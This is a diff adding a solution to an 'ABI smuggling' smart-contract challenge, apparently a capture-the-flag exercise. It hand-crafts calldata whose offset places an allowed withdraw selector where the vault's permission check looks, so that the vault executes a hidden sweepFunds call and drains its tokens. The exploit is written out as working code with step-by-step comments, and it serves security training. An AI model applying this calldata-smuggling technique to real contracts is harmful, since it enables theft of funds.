@@ -73,6 +73,57 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
+        // Step 1: Prepare the function selector for the "execute" function
+        // This is the function we intend to call on the vault contract.
+        bytes memory executeSelector = abi.encodeWithSignature("execute(address,bytes)");
+    
+        // Step 2: Convert the vault contract address into a `bytes32` format
+        // This is required for the payload as the vault address needs to be passed.
+        bytes32 vaultAddress = bytes32(uint256(uint160(address(vault))));
+    
+        // Step 3: Set the smuggle location
+        // This is the memory location where the actual payload will be located.
+        bytes32 smuggleLocation = 0x0000000000000000000000000000000000000000000000000000000000000080;
+    
+        // Step 4: Add a placeholder for random data (not used but fills required space in the payload).
+        bytes32 random = 0x0000000000000000000000000000000000000000000000000000000000000000;
+    
+        // Step 5: Our allowance (acts as part of the crafted payload)
+        // This si the function selector of the withdraw function which is checked in the execute function.
+        bytes32 ourAllowance = 0xd9caed1200000000000000000000000000000000000000000000000000000000;
+    
+        // Step 6: Specify the actual payload length
+        // This is the length of the actual function call we want to smuggle.
+        bytes32 actualPayloadLength = 0x0000000000000000000000000000000000000000000000000000000000000044;
+    
+        // Step 7: Construct the actual payload
+        // This payload represents the real function call we want to execute on the vault contract.
+        // The `sweepFunds(address,address)` function transfers funds from the vault to our recovery address.
+        bytes memory actualPayload = abi.encodeWithSignature("sweepFunds(address,address)", recovery, address(token));
+    
+        // Step 8: Combine all parts into the final crafted payload
+        // The final payload includes:
+        // - `executeSelector`: Calls the `execute` function of the vault
+        // - `vaultAddress`: The address of the vault contract
+        // - `smuggleLocation`: Memory location of the smuggled payload
+        // - `random`: Filler data
+        // - `ourAllowance`: Acts as part of the crafted data
+        // - `actualPayloadLength`: Specifies the length of the real function call
+        // - `actualPayload`: The actual function call to `sweepFunds` we want executed
+        bytes memory finalPayload = bytes.concat(
+            executeSelector,
+            vaultAddress,
+            smuggleLocation,
+            random,
+            ourAllowance,
+            actualPayloadLength,
+            actualPayload
+        );
+    
+        // Step 9: Perform the exploit by calling the vault with the crafted payload
+        // The `call` method sends the final crafted payload to the vault contract,
+        // tricking it into executing the `sweepFunds` function.
+        address(vault).call(finalPayload);
         
     }
 
